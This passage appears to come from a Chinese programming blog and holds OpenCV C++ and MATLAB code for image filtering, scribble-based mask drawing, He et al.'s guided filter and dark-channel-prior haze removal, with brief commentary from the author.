	case WAVESHAPE:
		/* 添加代码 */
		break;
	case Concentrated:
		MaxFrame(pImg);
		break;
	case Scattered:
		MinFrame(pImg);
		break;
	default:
		printf("no method support\n");
		break;
	}

	// 显示结果
	cvNamedWindow( "Image1", 1 );//创建窗口
	cvShowImage( "Image1", pImg );//显示图像

	cvWaitKey(0); //等待按键

	//销毁窗口 释放内存
	cvDestroyWindow( "Image" );//销毁窗口
	cvReleaseImage( &pImg ); //释放图像
	cvDestroyWindow( "Image1" );//销毁窗口
	cvReleaseImage( &pImg1 ); //释放图像

	return 0;

}



 

 
 
实现效果：

 
 
未完待续。。应该还有其他的算法，我再找找
 






#include <iostream> // for standard I/O
#include <string>   // for strings
#include <iomanip>  // for controlling float print precision 
#include <sstream>  // string to number conversion 

#include <opencv2/imgproc/imgproc.hpp>  // Gaussian Blur
#include <opencv2/core/core.hpp>        // Basic OpenCV structures (cv::Mat, Scalar)
#include <opencv2/highgui/highgui.hpp>  // OpenCV window I/O



using namespace std;
using namespace cv;


// images
Mat inputImg, showImg, segMask, segShowImg;

// mask
Mat fgScribbleMask, bgScribbleMask;


// user clicked mouse buttons flags
bool rButtonDown = false;
bool lButtonDown = false;
int scribbleRadius = 5;


// mouse listener
static void onMouse( int event, int x, int y, int, void* )
{
	//cout << "On Mouse: (" << x << "," << y << ")" <<endl;


	if (event == CV_EVENT_LBUTTONDOWN)
	{
		lButtonDown = true;

	}
	else if (event == CV_EVENT_RBUTTONDOWN)
	{
		rButtonDown = true;

	}
	else if (event == CV_EVENT_LBUTTONUP)
	{
		lButtonDown = false;
	}
	else if (event == CV_EVENT_RBUTTONUP)
	{
		rButtonDown = false;
	}
	else if (event == CV_EVENT_MOUSEMOVE)
	{
		if (rButtonDown)
		{
			// scribble the background

			circle(bgScribbleMask,Point(x,y),scribbleRadius, 255,-1);
			circle(showImg,Point(x,y),scribbleRadius, CV_RGB(0,0,255),-1);

		}
		else if (lButtonDown)
		{
			// scribble the foreground

			circle(fgScribbleMask,Point(x,y),scribbleRadius, 255,-1);
			circle(showImg,Point(x,y),scribbleRadius, CV_RGB(255,0,0),-1);

			//fgScribbleMask.at<char>(y,x)=(char)255;
			// set variables using mask
			//showImg.setTo(redColorElement,fgScribbleMask);

			//showImg.at<Vec3b>(y,x)[0] = 0;
			//showImg.at<Vec3b>(y,x)[1] = 0;
			//showImg.at<Vec3b>(y,x)[2] = 255;
		}

	}


	imshow("Scribble Image", showImg);
	imshow("fg mask", fgScribbleMask);
	imshow("bg mask", bgScribbleMask);
}


// clear everything before closing
void destroyAll()
{
	// destroy all windows
	destroyWindow("Input Image");
	destroyWindow("Scribble Image");
	
	
	destroyWindow("bg mask");
	destroyWindow("fg mask");
	destroyWindow("Segmentation Mask");
	destroyWindow("Segmentation Image");

	// clear all data
	fgScribbleMask.release();
	bgScribbleMask.release();
	inputImg.release();
	showImg.release();
	
	segMask.release();
	segShowImg.release();

	

}

// init all images/vars
int init(char * imgFileName)
{
	// Read the file
	inputImg = imread(imgFileName, CV_LOAD_IMAGE_COLOR);   
	showImg = inputImg.clone();
	segShowImg = inputImg.clone();



	// Check for invalid input
	if(!inputImg.data )                              
	{
		cout <<  "Could not open or find the image: " << imgFileName << std::endl ;
		return -1;
	}

	// this is the mask to keep the user scribbles
	fgScribbleMask.create(2,inputImg.size,CV_8UC1);
	fgScribbleMask = 0;
	bgScribbleMask.create(2,inputImg.size,CV_8UC1);
	bgScribbleMask = 0;
	segMask.create(2,inputImg.size,CV_8UC1);
	segMask = 0;
	

	// Create a window for display.
	namedWindow( "Input Image", CV_WINDOW_AUTOSIZE );
	namedWindow( "Scribble Image", CV_WINDOW_AUTOSIZE);

	namedWindow( "fg mask", CV_WINDOW_AUTOSIZE );
	namedWindow( "bg mask", CV_WINDOW_AUTOSIZE );


	// Show our image inside it.
	imshow( "Input Image", inputImg );                        
	imshow( "Scribble Image", showImg );  

	imshow("fg mask", fgScribbleMask);
	imshow("bg mask", bgScribbleMask);


	moveWindow("Scribble Image", 1,1);
	moveWindow("Input Image", inputImg.cols + 50,1);
	moveWindow("Bin Per Pixel", 2*(inputImg.cols + 50),1);
	moveWindow("Edges", 2*(inputImg.cols + 55),1);


	// set the callback on mouse
	setMouseCallback("Scribble Image", onMouse, 0);


	return 0;
}


int main(int argc, char *argv[])
{

	String image_name,numBinsStr,bhaSlopeStr;
	cout<<"input Parameters:"<<endl;
	cout<<"image name: ";
	cin>>image_name;
	

	// get img name parameter
	char * imgFileName = (char *)image_name.c_str();


	if (init(imgFileName)==-1)
	{
		cout <<  "Could not initialize" << endl ;
		return -1;
	}



	// Wait for a keystroke in the window
	for (;;)
	{
		char key = waitKey(0);                          
		switch (key)
		{
		case 'q':
			cout << "goodbye" << endl;
			destroyAll();
			return 0;
		case '-':
			//缩小画笔直径
			if (scribbleRadius > 2)
				scribbleRadius --;
			cout << "current radius is " << scribbleRadius << endl;
			break;
		case '+':
			if (scribbleRadius < 100)
				scribbleRadius ++;
			cout << "current radius is " << scribbleRadius << endl;
			break;
		case 's':
			{
				
	
				// this is where we store the results
				segMask = 0;
				inputImg.copyTo(segShowImg);
				//inputImg.copyTo(showImg);


				imwrite("bg.bmp",bgScribbleMask);

				break;

			}
		case 'r':
			{
				cout << "resetting" << endl;
				destroyAll();
				if (init(imgFileName)==-1)
				{
					cout <<  "could not initialize" << std::endl ;
					return -1;
				}
				break;
			}
		}
	}


	return 0;
} 





 论文下载地址：http://research.microsoft.com/en-us/um/people/jiansun/papers/GuidedFilter_ECCV10.pdf
本文主要介绍导向滤波，但是在网上看这算法还能去雾，不知道是具体是怎么利用导向滤波实现去雾的，希望过来人指点迷津，这块主要是重写了导向滤波应用于彩色图像的部分代码，希望与大家共同交流。
 
论文主要如下：
Kaiming He, Jian Sun, Xiaoou Tang. Single Image Haze Removal Using Dark Channel Prior
大致内容是提出了一个叫做暗原色先验的东西来对有雾图像进行处理，十分巧妙，有兴趣者可以看看。这里使用OpenCV实现文中的去雾算法，然而论文提到的soft matting未在本程序中实现。
 
原理如下：
 

 
 
滤波效果：
 
单通道效果：

 方法1效果：
 

 
 
 
方法2效果：

 
 
效果----为何要滤波：
 

 
 
guied filter滤波代码：使用了两种方法，代码来源后面参考文献中。我做了一些修改和比对工作。
 
 
// Guided Filter.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <iostream>
#include "opencv2/core/core.hpp"  
#include "opencv2/highgui/highgui.hpp"  
#include "opencv2/imgproc/imgproc.hpp"  
  
#pragma comment(lib,"opencv_core2410d.lib")                    
#pragma comment(lib,"opencv_highgui2410d.lib")                    
#pragma comment(lib,"opencv_imgproc2410d.lib")    

using namespace std;
using namespace cv;

Mat getimage(Mat &a)
{
	int hei  =a.rows;
	int wid = a.cols;
	Mat I(hei, wid, CV_64FC1);
	//convert image depth to CV_64F
	a.convertTo(I, CV_64FC1,1.0/255.0);
	//normalize the pixel to 0~1
	/*
	for( int i = 0; i< hei; i++){
		double *p = I.ptr<double>(i);
		for( int j = 0; j< wid; j++){
			p[j] = p[j]/255.0; 	
		}
	}
	*/
	return I;
}

Mat cumsum(Mat &imSrc, int rc)
{
	if(!imSrc.data)
	{
		cout << "no data input!\n" << endl;
	}
	int hei = imSrc.rows;
	int wid = imSrc.cols;
	Mat imCum = imSrc.clone();
	if( rc == 1)
	{
		for( int i =1;i < hei; i++)
		{
			for( int j = 0; j< wid; j++)
			{
				imCum.at<double>(i,j) += imCum.at<double>(i-1,j);
			}
		}
	}

	if( rc == 2)
	{
		for( int i =0;i < hei; i++)
		{
			for( int j = 1; j< wid; j++)
			{
				imCum.at<double>(i,j) += imCum.at<double>(i,j-1);
			}
		}
	}
	return imCum;
}

Mat boxfilter(Mat &imSrc, int r)
{
	int hei = imSrc.rows;
	int wid = imSrc.cols;
	Mat imDst = Mat::zeros( hei, wid, CV_64FC1);
	//imCum = cumsum(imSrc, 1);
	Mat imCum = cumsum(imSrc,1);
	//imDst(1:r+1, :) = imCum(1+r:2*r+1, :);
	for( int i = 0; i<r+1; i++)
	{
		for( int j=0; j<wid; j++ )
		{
			imDst.at<double>(i,j) = imCum.at<double>(i+r,j);
		}
	}
	//imDst(r+2:hei-r, :) = imCum(2*r+2:hei, :) - imCum(1:hei-2*r-1, :);
	for( int i =r+1; i<hei-r;i++)
	{
		for( int j = 0; j<wid;j++)
		{
			imDst.at<double>(i,j) = imCum.at<double>(i+r,j)-imCum.at<double>(i-r-1,j);
		}
	}
	//imDst(hei-r+1:hei, :) = repmat(imCum(hei, :), [r, 1]) - imCum(hei-2*r:hei-r-1, :);
	for( int i = hei-r; i< hei; i++)
	{
		for( int j = 0; j< wid; j++)
		{
			imDst.at<double>(i,j) = imCum.at<double>(hei-1,j)-imCum.at<double>(i-r-1,j);
		}
	}
	imCum = cumsum(imDst, 2);
	//imDst(:, 1:r+1) = imCum(:, 1+r:2*r+1);
	for( int i = 0; i<hei; i++)
	{
		for( int j=0; j<r+1; j++ )
		{
			imDst.at<double>(i,j) = imCum.at<double>(i,j+r);
		}
	}
	//imDst(:, r+2:wid-r) = imCum(:, 2*r+2:wid) - imCum(:, 1:wid-2*r-1);
	for( int i =0 ; i<hei;i++)
	{
		for( int j = r+1; j<wid-r ;j++ )
		{
			imDst.at<double>(i,j) = imCum.at<double>(i,j+r)-imCum.at<double>(i,j-r-1);
		}
	}
	//imDst(:, wid-r+1:wid) = repmat(imCum(:, wid), [1, r]) - imCum(:, wid-2*r:wid-r-1);
	for( int i = 0; i< hei; i++)
	{
		for( int j = wid-r; j<wid; j++)
		{
			imDst.at<double>(i,j) = imCum.at<double>(i,wid-1)-imCum.at<double>(i,j-r-1);
		}
	}
	return imDst;
}

Mat guidedfilter( Mat &I, Mat &p, int r, double eps ) 
{
	int hei = I.rows;
	int wid = I.cols;
	//N = boxfilter(ones(hei, wid), r);
	Mat one = Mat::ones(hei, wid, CV_64FC1);
	Mat N = boxfilter(one, r);

	//mean_I = boxfilter(I, r) ./ N;
	Mat mean_I(hei, wid, CV_64FC1);
	divide(boxfilter(I, r), N, mean_I);

	//mean_p = boxfilter(p, r) ./ N;
	Mat mean_p(hei, wid, CV_64FC1);
	divide(boxfilter(p, r), N, mean_p);

	//mean_Ip = boxfilter(I.*p, r) ./ N;
	Mat mul_Ip(hei, wid, CV_64FC1);
	Mat mean_Ip(hei, wid, CV_64FC1);
	multiply(I,p,mul_Ip);
	divide(boxfilter(mul_Ip, r), N, mean_Ip);

	//cov_Ip = mean_Ip - mean_I .* mean_p
	//this is the covariance of (I, p) in each local patch.
	Mat mul_mean_Ip(hei, wid, CV_64FC1);
	Mat cov_Ip(hei, wid, CV_64FC1);
	multiply(mean_I, mean_p, mul_mean_Ip);
	subtract(mean_Ip, mul_mean_Ip, cov_Ip);

	//mean_II = boxfilter(I.*I, r) ./ N;
	Mat mul_II(hei, wid, CV_64FC1);
	Mat mean_II(hei, wid, CV_64FC1);
	multiply(I, I, mul_II);
	divide(boxfilter(mul_II, r), N, mean_II);

	//var_I = mean_II - mean_I .* mean_I;
	Mat mul_mean_II(hei, wid, CV_64FC1);
	Mat var_I(hei, wid, CV_64FC1);
	multiply(mean_I, mean_I, mul_mean_II);
	subtract(mean_II, mul_mean_II, var_I);

	//a = cov_Ip ./ (var_I + eps);
	Mat a(hei, wid, CV_64FC1);
	for( int i = 0; i< hei; i++){
		double *p = var_I.ptr<double>(i);
		for( int j = 0; j< wid; j++){
			p[j] = p[j] +eps; 	
		}
	}
	divide(cov_Ip, var_I, a);

	//b = mean_p - a .* mean_I;
	Mat a_mean_I(hei ,wid, CV_64FC1);
	Mat b(hei ,wid, CV_64FC1);
	multiply(a, mean_I, a_mean_I);
	subtract(mean_p, a_mean_I, b);

	//mean_a = boxfilter(a, r) ./ N;
	Mat mean_a(hei, wid, CV_64FC1);
	divide(boxfilter(a, r), N, mean_a);
	//mean_b = boxfilter(b, r) ./ N;
	Mat mean_b(hei, wid, CV_64FC1);
	divide(boxfilter(b, r), N, mean_b);

	//q = mean_a .* I + mean_b;
	Mat mean_a_I(hei, wid, CV_64FC1);
	Mat q(hei, wid, CV_64FC1);
	multiply(mean_a, I, mean_a_I);
	add(mean_a_I, mean_b, q);

	return q;
}

/*****************

http://research.microsoft.com/en-us/um/people/kahe/eccv10/
推酷上的一篇文章：
http://www.tuicool.com/articles/Mv2iiu

************************/
cv::Mat guidedFilter2(cv::Mat I, cv::Mat p, int r, double eps)
{
  /*
  % GUIDEDFILTER   O(1) time implementation of guided filter.
  %
  %   - guidance image: I (should be a gray-scale/single channel image)
  %   - filtering input image: p (should be a gray-scale/single channel image)
  %   - local window radius: r
  %   - regularization parameter: eps
  */
 
  cv::Mat _I;
  I.convertTo(_I, CV_64FC1);
  I = _I;
 
  cv::Mat _p;
  p.convertTo(_p, CV_64FC1);
  p = _p;
 
  //[hei, wid] = size(I);
  int hei = I.rows;
  int wid = I.cols;
 
  //N = boxfilter(ones(hei, wid), r); % the size of each local patch; N=(2r+1)^2 except for boundary pixels.
  cv::Mat N;
  cv::boxFilter(cv::Mat::ones(hei, wid, I.type()), N, CV_64FC1, cv::Size(r, r));
 
  //mean_I = boxfilter(I, r) ./ N;
  cv::Mat mean_I;
  cv::boxFilter(I, mean_I, CV_64FC1, cv::Size(r, r));
  
  //mean_p = boxfilter(p, r) ./ N;
  cv::Mat mean_p;
  cv::boxFilter(p, mean_p, CV_64FC1, cv::Size(r, r));
 
  //mean_Ip = boxfilter(I.*p, r) ./ N;
  cv::Mat mean_Ip;
  cv::boxFilter(I.mul(p), mean_Ip, CV_64FC1, cv::Size(r, r));
 
  //cov_Ip = mean_Ip - mean_I .* mean_p; % this is the covariance of (I, p) in each local patch.
  cv::Mat cov_Ip = mean_Ip - mean_I.mul(mean_p);
 
  //mean_II = boxfilter(I.*I, r) ./ N;
  cv::Mat mean_II;
  cv::boxFilter(I.mul(I), mean_II, CV_64FC1, cv::Size(r, r));
 
  //var_I = mean_II - mean_I .* mean_I;
  cv::Mat var_I = mean_II - mean_I.mul(mean_I);
 
  //a = cov_Ip ./ (var_I + eps); % Eqn. (5) in the paper;	
  cv::Mat a = cov_Ip/(var_I + eps);
 
  //b = mean_p - a .* mean_I; % Eqn. (6) in the paper;
  cv::Mat b = mean_p - a.mul(mean_I);
 
  //mean_a = boxfilter(a, r) ./ N;
  cv::Mat mean_a;
  cv::boxFilter(a, mean_a, CV_64FC1, cv::Size(r, r));
  mean_a = mean_a/N;
 
  //mean_b = boxfilter(b, r) ./ N;
  cv::Mat mean_b;
  cv::boxFilter(b, mean_b, CV_64FC1, cv::Size(r, r));
  mean_b = mean_b/N;
 
  //q = mean_a .* I + mean_b; % Eqn. (8) in the paper;
  cv::Mat q = mean_a.mul(I) + mean_b;
 
  return q;
}



int _tmain(int argc, _TCHAR* argv[])
{
	int r = 4;
	double eps = 0.01;

	string image_name ;
	cout<<"input name:"<<endl;
	cin>>image_name;

		
	/*
	CV_LOAD_IMAGE_ANYDEPTH - If set, return 16-bit/32-bit image when the input has the corresponding depth, 
	otherwise convert it to 8-bit.
	CV_LOAD_IMAGE_COLOR - If set, always convert image to the color one
	CV_LOAD_IMAGE_GRAYSCALE - If set, always convert image to the grayscale one
	>0 Return a 3-channel color image.

Note:

	In the current implementation the alpha channel, if any, is stripped from the output image.
	Use negative value if you need the alpha channel.

	=0 Return a grayscale image.
	<0 Return the loaded image as is (with alpha channel).
*/


	Mat image_src = imread(image_name,CV_LOAD_IMAGE_COLOR);
	Mat image_gray(image_src.size(),CV_8UC1);

	cvtColor(image_src,image_gray,CV_BGR2GRAY);

	vector<Mat> bgr_src,bgr_dst;
	split(image_src,bgr_src);//分解每个通道

	Mat dst_color;
	
	double time;
	time = (double)getTickCount();
	for(int i=0;i<3;i++)  
	{  
		Mat I = getimage(bgr_src[i]);
		Mat p = I.clone();
		
		Mat q = guidedfilter(I, p, r, eps);
		//string number ;
		//sprintf((char *)number.c_str(),"%d",i);
		//imshow(number,q);

		//imshow("方法1：", q);
		bgr_dst.push_back(q);
		//cv::merge(q,dst_color);
		
	}  
	merge(bgr_dst,dst_color);

	//imwrite("filtered.bmp", q*255);
	time = 1000*((double)getTickCount() - time)/getTickFrequency();  

	cout <<endl<<"Time of guided filter for  runs: " << time << " milliseconds."<< endl; 

	imshow("原图像的灰度图", image_gray);
	imshow("方法1：", dst_color);
	imwrite("result.jpg",dst_color*255);
	
	double time2 = 0;
	time2 = (double)getTickCount();

	Mat I = getimage(image_gray);
	Mat p = I.clone();
	//int r = 8;
	//double eps = 0.04;
	
	//Mat q = guidedfilter(I, p, r, eps);

	//imwrite("filtered.bmp", q*255);
	//*/

	/*imshow("原图像的灰度图", image_gray);
	imshow("方法1：", q);*/

	imshow("方法2：",guidedFilter2(I, p, r, eps));
	time2 = 1000*((double)getTickCount() - time2)/getTickFrequency();  

	cout <<endl<<"Time of guided filter2 for  runs: " << time2 << " milliseconds."<< endl; 
	waitKey(0);


	return 0;
}



 
 
下面的代码还没有真正的调试，只是找到了，先放在这里，后面有空再看看研究一下。 
 
去雾代码1：
 

 

#include<iostream.h>

#include<cv.h>

#include<highgui.h>

char tbarname1[] = "调节block";

//定义两个滑动条,用于调节参数

char tbarname2[] = "调节w";

//w是为了保留一部分的雾

int block=5;

int w1=80;

double w;

IplImage *src=NULL;

IplImage *dst=NULL;

 

//定义去雾函数如下

IplImage *quw(IplImage *src,int block,double w)

{

//图像分别有三个颜色通道

         IplImage *dst1=NULL;

         IplImage *dst2=NULL;

         IplImage *dst3=NULL;

         IplImage *imgroi1;

         //dst1的ROI

         IplImage *imgroi2;

         //dst2的ROI

         IplImage *imgroi3;

         //dst3的ROI

         IplImage *roidark;

         //dark channel的ROI

         IplImage *dark_channel=NULL;

         //暗原色先验的指针

         IplImage *toushelv=NULL;

         //透射率

 

//去雾算法运算后的三个通道

         IplImage *j1=NULL;

         IplImage *j2=NULL;

         IplImage *j3=NULL;

//去雾后的图像,三通道合并成

         IplImage *dst=NULL;

//源图像ROI位置以及大小

         CvRect ROI_rect;

 

//分离的三个通道

         dst1=cvCreateImage(cvSize(src->width,src->height),IPL_DEPTH_8U,1);

         dst2=cvCreateImage(cvSize(src->width,src->height),IPL_DEPTH_8U,1);

         dst3=cvCreateImage(cvSize(src->width,src->height),IPL_DEPTH_8U,1);

 

//为各个ROI分配内存

         imgroi1=cvCreateImage(cvSize(block,block),IPL_DEPTH_8U,1);

         imgroi2=cvCreateImage(cvSize(block,block),IPL_DEPTH_8U,1);

         imgroi3=cvCreateImage(cvSize(block,block),IPL_DEPTH_8U,1);

         roidark=cvCreateImage(cvSize(block,block),IPL_DEPTH_8U,1);

 

//为j1 j2 j3分配大小

         j1=cvCreateImage(cvSize(src->width,src->height),IPL_DEPTH_8U,1);

         j2=cvCreateImage(cvSize(src->width,src->height),IPL_DEPTH_8U,1);

         j3=cvCreateImage(cvSize(src->width,src->height),IPL_DEPTH_8U,1);

 

//为暗原色先验指针分配大小

         dark_channel=cvCreateImage(cvSize(src->width,src->height),IPL_DEPTH_8U,1);

//为透射率指针分配大小

         toushelv=cvCreateImage(cvSize(src->width,src->height),IPL_DEPTH_8U,1);

//dst分配大小

         dst=cvCreateImage(cvSize(src->width,src->height),IPL_DEPTH_8U,3);

//将原彩色图像分离成三通道

         cvSplit(src,dst1,dst2,dst3,NULL);

//求暗原色

         ROI_rect.width=block;

         ROI_rect.height=block;

         ROI_rect.x=0;

         ROI_rect.y=0;

 

 

         int i;

         int j;

         double min1=0;

         double max1=0;

         double min2=0;

         double max2=0;

         double min3=0;

         double max3=0;

         double min=0;

         CvScalar value;

         for(i=0;i<src->width/block;i++)

         {        for(j=0;j<src->height/block;j++)

                   {

                            //分别计算三个通道内ROI的最小值

                            cvSetImageROI(dst1,ROI_rect);

                            cvCopy(dst1,imgroi1,NULL);

                            cvMinMaxLoc(imgroi1,&min1,&max1,NULL,NULL);

                            cvSetImageROI(dst2,ROI_rect);

                            cvCopy(dst2,imgroi2,NULL);

                            cvMinMaxLoc(imgroi2,&min2,&max2,NULL,NULL);

                            cvSetImageROI(dst3,ROI_rect);

                            cvCopy(dst3,imgroi3,NULL);

                            cvMinMaxLoc(imgroi3,&min3,&max3,NULL,NULL);

                            //求三个通道内最小值的最小值

                            if(min1<min2)

                                     min=min1;

                            else

                                     min=min2;

                            if(min>min3)

                                     min=min3;//min为这个ROI中暗原色

                            value=cvScalar(min,min,min,min);//min放在value中

                            //min赋予dark_channel中相应的ROI

                            cvSetImageROI(dark_channel,ROI_rect);

                            cvSet(roidark,value,NULL);

                            cvCopy(roidark,dark_channel,NULL);

                            //释放各个ROI

                            cvResetImageROI(dst1);

                            cvResetImageROI(dst2);

                            cvResetImageROI(dst3);

                            cvResetImageROI(dark_channel);

                            //转入下一个ROI

                            ROI_rect.x=block*i;

                            ROI_rect.y=block*j;

                   }

         }

         //保存暗原色先验的图像

         cvSaveImage("f:/dark_channel_prior.jpg",dark_channel);

//利用得到的暗原色先验dark_channel_prior.jpg求大气光强

         double min_dark;

         double max_dark;

         CvPoint min_loc;

         CvPoint max_loc;//max_loc是暗原色先验最亮一小块的原坐标

         cvMinMaxLoc(dark_channel,&min_dark,&max_dark,&min_loc,&max_loc,NULL);

         cout<<max_loc.x<<" "<<max_loc.y<<endl;

         ROI_rect.x=max_loc.x;

         ROI_rect.y=max_loc.y;

         double A_dst1;//定义大气光成分的估计值

         double dst1_min;

         double A_dst2;

         double dst2_min;

         double A_dst3;

         double dst3_min;

         cvSetImageROI(dst1,ROI_rect);

//按照论文方法求大气光强估计值

         cvCopy(dst1,imgroi1,NULL);

         cvMinMaxLoc(imgroi1,&dst1_min,&A_dst1,NULL,NULL);

         cvSetImageROI(dst2,ROI_rect);

         cvCopy(dst2,imgroi2,NULL);

         cvMinMaxLoc(imgroi2,&dst2_min,&A_dst2,NULL,NULL);

         cvSetImageROI(dst3,ROI_rect);

         cvCopy(dst3,imgroi3,NULL);

         cvMinMaxLoc(imgroi3,&dst3_min,&A_dst3,NULL,NULL);

         cout<<A_dst1<<" "<<A_dst2<<" "<<A_dst3<<endl;//这三值为大气光强度估计值

//求透射率

         int k;

         int l;

         CvScalar m;

         CvScalar n;//暗原色先验各元素值

 

         for(k=0;k<src->height;k++)

         {

                   for(l=0;l<src->width;l++)

                   {

                            m=cvGet2D(dark_channel,k,l);

                            n=cvScalar(255-w*m.val[0]);

                            //w目的是保留一部分的雾,使图像看起来真实些

                            cvSet2D(toushelv,k,l,n);

                   }

         }

         cvSaveImage("f:/toushelv.jpg",toushelv);

 

//求无雾图像

         int p,q;

         double tx;

         double jj1,jj2,jj3;

         CvScalar ix,jx;

         for(p=0;p<src->height;p++)

         {

                   for(q=0;q<src->width;q++)

                   {

                            tx=cvGetReal2D(toushelv,p,q);

                            tx=tx/255;

                            if(tx<0.1)

                                     tx=0.1;

                            ix=cvGet2D(src,p,q);

                            jj1=(ix.val[0]-A_dst1)/tx+A_dst1;//根据雾产生模型运算,还原出无雾图像

                            jj2=(ix.val[1]-A_dst2)/tx+A_dst2;

                            jj3=(ix.val[2]-A_dst3)/tx+A_dst3;

                            jx=cvScalar(jj1,jj2,jj3,0.0);

                            cvSet2D(dst,p,q,jx);

                   }

         }

         cvSaveImage("f:/removed_haze.jpg",dst);

 

//释放指针

         cvReleaseImage(&dst1);

         cvReleaseImage(&dst2);

         cvReleaseImage(&dst3);

         cvReleaseImage(&imgroi1);

         cvReleaseImage(&imgroi2);

         cvReleaseImage(&imgroi3);

         cvReleaseImage(&roidark);

         cvReleaseImage(&dark_channel);

         cvReleaseImage(&toushelv);

         cvReleaseImage(&j1);

         cvReleaseImage(&j2);

         cvReleaseImage(&j3);

         return dst;

}

 

void on_trackbar1(int h)

{

         dst=quw(src,block,w);

         cvShowImage("目的图像",dst);

//      cvWaitKey(0);

}

void on_trackbar2(int h)

{

 

         w=(double)w1/100;

         dst=quw(src,block,w);

         cvShowImage("目的图像",dst);

//      cvWaitKey(0);

}

//主函数如下

void main()

{

         //打开图像

         src=cvLoadImage("8.jpg",-1);

         //创造窗口

         cvNamedWindow("有雾图像",CV_WINDOW_AUTOSIZE);

         cvShowImage("有雾图像",src);

         cvNamedWindow("目的图像",CV_WINDOW_AUTOSIZE);

         cvCreateTrackbar(tbarname1, "目的图像", &block, 15, on_trackbar1);

         cvCreateTrackbar(tbarname2, "目的图像", &w1, 100, on_trackbar2);

         cvWaitKey(0);

         cvReleaseImage(&src);

         cvReleaseImage(&dst);

}


 
去雾matlab代码：
<span style="font-size:24px;">　　function q = guidedfilter(I, p, r, eps)
　　%   GUIDEDFILTER   O(1) time implementation of guided filter.
　　%
　　%   - guidance image: I (should be a gray-scale/single channel image)
　　%   - filtering input image: p (should be a gray-scale/single channel image)
　　%   - local window radius: r
　　%   - regularization parameter: eps

　　[hei, wid] = size(I);
　　N = boxfilter(ones(hei, wid), r); % the size of each local patch; N=(2r+1)^2 except for boundary pixels.

　　% imwrite(uint8(N), 'N.jpg');
　　% figure,imshow(N,[]),title('N');
　　

　　mean_I = boxfilter(I, r) ./ N;
　　mean_p = boxfilter(p, r) ./ N;
　　mean_Ip = boxfilter(I.*p, r) ./ N;
　　cov_Ip = mean_Ip - mean_I .* mean_p; % this is the covariance of (I, p) in each local patch.

　　mean_II = boxfilter(I.*I, r) ./ N;
　　var_I = mean_II - mean_I .* mean_I;

　　a = cov_Ip ./ (var_I + eps); % Eqn. (5) in the paper;
　　b = mean_p - a .* mean_I; % Eqn. (6) in the paper;

　　mean_a = boxfilter(a, r) ./ N;
　　mean_b = boxfilter(b, r) ./ N;

　　q = mean_a .* I + mean_b; % Eqn. (8) in the paper;
　　end</span>
去雾代码2：
 
#include "stdafx.h"
#include <opencv2\opencv.hpp> 
#include "cv.h"
#include <cxcore.h>
#include "highgui.h"
#include <windows.h>
#include <math.h>
using namespace cv;
using namespace std; 

//求三个通道中最小值的最小值时调用的函数
double min(double b,double g, double r)
{
	double result = b;
	if(result>g)
		result = g;
	if(result>r)
		result = r;
	return result;
};
double max(double a,double b)
{
	double MAX;
	if (a<b)
		MAX = b;
	else
		MAX = a;
	return MAX;
};
double min2(double a,double b)//比较两个数值中的最小值并返回
{
	double MIN;
	if (a<b)
		MIN = a;
	else
		MIN = b;
	return MIN;
};
//这个函数相当于darkchannel的功能，但在padarray时。使用的是将边缘像素复制的方法，不是matlab的将边缘处镜像复制,计算出darkchannel后有计算了最大值A
double doDarkChannel(IplImage* in,int patchsize)
{
	
	int height,width,step,channels;//图像的宽，高，等信息，height，width是输入图像的尺寸，也是输出图像的尺寸，step是输出图像jout的（j对应matlab代码中的darkchannel的输出图像J）
	int i,j,k;//用于循环的变量
	uchar *data2;//输出的结果图像的指针
	height = in->height;//获取输入图像的宽高等信息
	width = in->width;
	int patch = patchsize/2;//图像要延拓的边缘的宽度
	IplImage* mout=cvCreateImage(cvSize(in->width+patchsize,in->height+patchsize),in->depth,in->nChannels);   //存放图像被镜像延拓后图像的空图像
	cvCopyMakeBorder(in,mout,cvPoint(patch,patch),IPL_BORDER_REPLICATE);//这个函数相当于padarray，mout中存放padarrry后的图像
	IplImage* jout = cvCreateImage(cvSize(in->width,in->height),in->depth,1);//darkchannel 的输出结果，J
	
	step = jout->widthStep/sizeof(uchar);//step是单通道输出图像jout的widthstep
	data2 = (uchar *)jout->imageData;//指向输出图像的数据头

	for(i=0;i<height;i++)
		{
       for(j=0;j<width;j++)   
          { 
				cvSetImageROI(mout, cvRect(j, i, patchsize, patchsize));//操作输入图像的（i，j）点处patchsize大小的图像块
				IplImage*  patch_out=cvCreateImage(cvSize(patchsize,patchsize),in->depth,in->nChannels);//存储三通道图像块的临时内存区，循环体里用到的内存区域再循环体里申请，在循环体里释放
				cvCopy(mout,patch_out);//将patchsize大小的图像块存入临时图像块patch_out
				cvResetImageROI(mout); //释放mout

				//以下内容是利用cnMinMaxloc分别计算三个通道中的最小值
				double MinValue;
				double MaxValue;
				double B_Min,G_Min,R_Min;
				CvPoint MinLocation;
				CvPoint MaxLocation;
				cvSetImageCOI(patch_out,1);
				cvMinMaxLoc(patch_out,& MinValue,& MaxValue,& MinLocation,& MaxLocation);
				B_Min = MinValue;
				cvSetImageCOI(patch_out,2);
				cvMinMaxLoc(patch_out,& MinValue,& MaxValue,& MinLocation,& MaxLocation);
				G_Min = MinValue;
				cvSetImageCOI(patch_out,3);
				cvMinMaxLoc(patch_out,& MinValue,& MaxValue,& MinLocation,& MaxLocation);
				R_Min = MinValue;
				int dark_point = (int)min(B_Min,G_Min,R_Min);
				//三个通道的最小值都已经被分别提取出来了
				data2[i*step+j] = dark_point;//step 是jout的step，是单通道的
				cvReleaseImage(&patch_out);				
			};
	};
	double MinValue;
	double MaxValue;
	double B_Min,G_Min,R_Min;
	CvPoint MinLocation;
	CvPoint MaxLocation;
	cvSetImageCOI(jout,1);
	cvMinMaxLoc(jout,& MinValue,& MaxValue,& MinLocation,& MaxLocation);
	cvReleaseImage(&mout);
	cout<<"计算暗通道函数运行成功"<<"\n";
	return MaxValue;

};
//该函数的作用相当于matlab代码中求取三个通道中最小值，然后以最小值组成一幅灰度图
IplImage* doMinChannel(IplImage* in)
{
	IplImage* b = cvCreateImage(cvSize(in->width,in->height),in->depth,1);
	IplImage* g = cvCreateImage(cvSize(in->width,in->height),in->depth,1);
	IplImage* r = cvCreateImage(cvSize(in->width,in->height),in->depth,1);//创建保存读入图像三个通道的的内存区域
	IplImage* w = cvCreateImage(cvSize(in->width,in->height),in->depth,1);//创建保存输出图像的内存区域（三个通道中最小值组成的一幅灰度图）
	cvSetImageCOI(in,1);
	cvCopy(in,b);
	cvSetImageCOI(in,2);
	cvCopy(in,g);
	cvSetImageCOI(in,3);
